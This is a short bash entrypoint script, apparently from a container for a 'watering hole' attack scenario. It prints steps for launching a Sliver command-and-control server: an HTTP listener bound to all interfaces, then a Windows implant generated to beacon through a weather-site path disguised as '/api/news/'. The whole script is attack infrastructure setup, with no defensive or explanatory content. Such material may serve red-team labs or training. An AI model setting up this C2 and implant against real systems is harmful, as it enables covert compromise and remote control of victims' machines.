#!/bin/bash
set -e

echo "=== Watering Hole - C2 Server (Sliver) ==="
echo "Sliver C2 ready. To start:"
echo "  sliver-server"
echo ""
echo "Then inside sliver console:"
echo "  http --lport ${SLIVER_HTTP_PORT} --lhost 0.0.0.0"
echo "  generate --http <weather-server-domain>/api/news/ --os windows --arch amd64 --save /home/sliver/builds"
echo "============================================"

exec "$@"
